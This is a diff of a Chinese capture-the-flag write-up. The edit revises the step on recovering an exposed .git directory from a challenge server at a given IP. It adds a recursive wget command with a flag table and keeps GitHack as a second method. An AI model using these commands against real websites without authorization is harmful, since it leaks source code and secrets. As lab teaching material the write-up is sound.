@@ -57,31 +57,43 @@ objects/
 refs/
 ```
 
-### 3. 使用 GitHack 工具恢复仓库
-
-**下载 GitHack**：
+### 3. 恢复 Git 仓库
+**方法一：使用 wget 下载 .git 目录（本次使用的方法）**
 ```bash
-git clone https://github.com/lijiejie/GitHack.git
+# 1. 回到桌面
+cd ~/Desktop
+
+# 2. 用 wget 下载整个 .git 目录
+wget -r -np -nH --cut-dirs=0 -R "index.html*" http://160.202.254.160:17030/.git/
+
+# 3. 进入下载的目录
+cd 160.202.254.160:17030
+
+# 4. 恢复 Git 仓库文件
+git checkout .
 ```
+**参数说明：**
+| 参数                 | 作用               |
+| :----------------- | :--------------- |
+| `-r`               | 递归下载             |
+| `-np`              | 不向上级目录下载         |
+| `-nH`              | 不创建主机名目录         |
+| `--cut-dirs=0`     | 不忽略目录层级          |
+| `-R "index.html*"` | 排除 index.html 文件 |
 
-**进入目录并运行**：
+
+
+**方法二：使用 GitHack 工具**
 ```bash
+# 下载 GitHack
+git clone https://github.com/lijiejie/GitHack.git
+
+# 进入目录并运行
 cd GitHack
 python GitHack.py http://160.202.254.160:17030/.git/
 ```
-
-**输出结果**：
-```
-[+] Download and parse index file ...
-[+] flag.txt
-[+] index.html
-[OK] flag.txt
-[OK] index.html
-```
-
-**查看恢复的文件**：
+**查看恢复的文件：**
 ```bash
-cd 160.202.254.160_17030
 ls
 # 输出：flag.txt  index.html
 
@@ -89,15 +101,6 @@ cat flag.txt
 # 输出：flag{not_here}  （假的 flag）
 
 cat index.html
-# 输出：
-# <html>
-# <head>
-# <body>
-# <p>Hello,world!!!</p>
-# <p>this is my friend:<!--tig--></p>
-# </body>
-# </head>
-# </html>
 ```
 
 ### 4. 分析 Git 历史记录
